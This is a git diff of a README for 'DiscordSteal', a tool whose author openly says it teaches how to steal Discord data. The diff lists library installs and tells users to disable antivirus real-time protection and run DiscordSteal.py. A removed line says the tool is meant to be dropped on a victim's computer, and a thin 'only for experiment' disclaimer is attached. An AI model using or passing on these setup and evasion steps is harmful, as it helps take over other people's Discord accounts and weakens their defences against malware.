@@ -1,15 +1,33 @@
 # DiscordSteal
 I’m @sleshTekk I'll teach you how to steal discord data. #You will need to install a library in cmd for the software to work.
-Download Python 3.10.9
-    
 
+❗️ You need download Python 3.10.9
     
-    CMD COMMANDS
+❗️ You will need to install the library to open the software in cmd.
+    
     pip install pycryptodome
     python3 -m pip install requests
-    pip install pywin32    
+    pip install pywin32
+  
+ ❗️ To run the software, in order for it to work, you need to turn off real-time protection❗️  
 
-To successfully use the software, you need to disable real-time protection, this is done to connect software modules so that you can later throw it on the victim's computer.
-Use these actions only to familiarize yourself with how the software works, but not for bad purposes ;) 
+✅ Once you have downloaded the entire library, you need to transfer the DiscordSteal file to your desktop
+once you have transferred the file to the desktop, you need to go to cmd and register the directory to your file to run it.
+This is basically how it is done.
 
-![Screenshot_10](https://github.com/sleshTekk/DiscordSteal/assets/163595476/4b0f231c-5c7a-4650-9f4a-0354d7a353ab)
+    cd Desktop
+
+✅ As the directory was prescribed, now is the time for the most interesting thing, namely the launch of the software itself, in order to open it we will need to register such a command in cmd. 
+
+    python DiscordSteal.py
+
+🟢 Congratulations, you have just launched the software and you can use it, if you succeeded, then you should have something like this 🟢
+
+    ![Screenshot_13](https://github.com/sleshTekk/DiscordSteal/assets/163595476/c40509e0-3cb3-4ff1-abb5-c03eaaeb6ccc)
+
+⚠️ WARNING Use only as part of an experiment and no more, you are responsible for your own actions ⚠️
+
+    ![Screenshot_14](https://github.com/sleshTekk/DiscordSteal/assets/163595476/23c1ccc1-bc8e-42fd-84ae-bfadf5eecf66)
+
+
+
